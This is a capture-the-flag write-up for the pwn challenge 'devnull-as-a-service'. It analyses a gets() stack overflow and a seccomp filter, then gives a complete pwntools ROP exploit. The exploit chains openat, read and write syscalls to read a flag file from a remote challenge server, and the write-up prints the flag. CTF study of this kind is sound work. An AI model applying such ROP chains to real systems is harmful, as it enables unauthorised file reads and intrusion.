https://ctftime.org/event/2467

# devnull-as-a-service (pwn)

## Analysis

`dev_null` @ `0x401e72`
- installs a seccomp filter with `enable_seccomp()`
- calls `gets` with a buffer on the stack that is offset 0x10 bytes from the return address and has no stack cookie

`enable_seccomp` @ `0x401a86`
- installs a seccomp filter

### Seccomp Filter Analysis

The following filter allows `openat`, `read` and `write`:

```bash
$ seccomp-tools dump ./dev_null 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x1c 0xc000003e  if (A != ARCH_X86_64) goto 0030
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x19 0xffffffff  if (A != 0xffffffff) goto 0030
 0005: 0x15 0x18 0x00 0x00000002  if (A == open) goto 0030
 0006: 0x15 0x17 0x00 0x00000003  if (A == close) goto 0030
 0007: 0x15 0x16 0x00 0x00000012  if (A == pwrite64) goto 0030
 0008: 0x15 0x15 0x00 0x00000014  if (A == writev) goto 0030
 0009: 0x15 0x14 0x00 0x00000016  if (A == pipe) goto 0030
 0010: 0x15 0x13 0x00 0x00000020  if (A == dup) goto 0030
 0011: 0x15 0x12 0x00 0x00000021  if (A == dup2) goto 0030
 0012: 0x15 0x11 0x00 0x00000028  if (A == sendfile) goto 0030
 0013: 0x15 0x10 0x00 0x00000029  if (A == socket) goto 0030
 0014: 0x15 0x0f 0x00 0x0000002c  if (A == sendto) goto 0030
 0015: 0x15 0x0e 0x00 0x0000002e  if (A == sendmsg) goto 0030
 0016: 0x15 0x0d 0x00 0x00000031  if (A == bind) goto 0030
 0017: 0x15 0x0c 0x00 0x00000038  if (A == clone) goto 0030
 0018: 0x15 0x0b 0x00 0x00000039  if (A == fork) goto 0030
 0019: 0x15 0x0a 0x00 0x0000003a  if (A == vfork) goto 0030
 0020: 0x15 0x09 0x00 0x0000003b  if (A == execve) goto 0030
 0021: 0x15 0x08 0x00 0x00000065  if (A == ptrace) goto 0030
 0022: 0x15 0x07 0x00 0x00000113  if (A == splice) goto 0030
 0023: 0x15 0x06 0x00 0x00000114  if (A == tee) goto 0030
 0024: 0x15 0x05 0x00 0x00000124  if (A == dup3) goto 0030
 0025: 0x15 0x04 0x00 0x00000125  if (A == pipe2) goto 0030
 0026: 0x15 0x03 0x00 0x00000128  if (A == pwritev) goto 0030
 0027: 0x15 0x02 0x00 0x00000137  if (A == process_vm_writev) goto 0030
 0028: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0030
 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0030: 0x06 0x00 0x00 0x00000000  return KILL
```

## Solution

```python
#!/usr/bin/env python3

from pwn import *

SCRATCH_MEMORY = 0x4af000

 # mov qword ptr [rsi], rax ; ret
GADGET_MOV_QWORD_PTR_RSI_RAX = 0x420f45

# xchg rax, rdx ; ret
GADGET_XCHG_RAX_RDX = 0x41799a

FLAG_SIZE = 46

#context.log_level = "debug"
elf = ELF("./dev_null", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b dev_null")
p = remote("586c045f-b218-4c7c-b4ea-dbb39705ab9d.x3c.tf", 31337, ssl=True)

p.readline()

rop = ROP(elf)
rop.raw(b"A" * 0x10)

# write the path to memory
rop.rsi = SCRATCH_MEMORY
rop.rax = u64(b"/home/ct")
rop.raw(GADGET_MOV_QWORD_PTR_RSI_RAX)
rop.rsi = SCRATCH_MEMORY + 8
rop.rax = u64(b"f/flag.t")
rop.raw(GADGET_MOV_QWORD_PTR_RSI_RAX)
rop.rsi = SCRATCH_MEMORY + 16
rop.rax = u64(b"xt\x00\x00\x00\x00\x00\x00")
rop.raw(GADGET_MOV_QWORD_PTR_RSI_RAX)

# openat(-1, "/home/ctf/flag.txt", O_RDONLY) => 3
rop.rdi = -1
rop.rsi = SCRATCH_MEMORY
rop.rax = constants.SYS_openat
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# read(flag, SCRATCH_MEMORY + 24, FLAG_SIZE)
rop.rdi = 3
rop.rsi = SCRATCH_MEMORY + 24
rop.rax = FLAG_SIZE
rop.raw(GADGET_XCHG_RAX_RDX)
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# write(stdout, SCRATCH_MEMORY + 24, FLAG_SIZE)
rop.rdi = 1
rop.rsi = SCRATCH_MEMORY + 24
rop.rax = FLAG_SIZE
rop.raw(GADGET_XCHG_RAX_RDX)
rop.rax = constants.SYS_write
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendline(rop.chain())

# MVM{r0p_4nd_sh3llc0d3_f0rm5_4_p3rf3c7_b4l4nc3}
print(p.readuntil(b"}").decode())
```

## Flag
`MVM{r0p_4nd_sh3llc0d3_f0rm5_4_p3rf3c7_b4l4nc3}`

smiley 2025/01/26
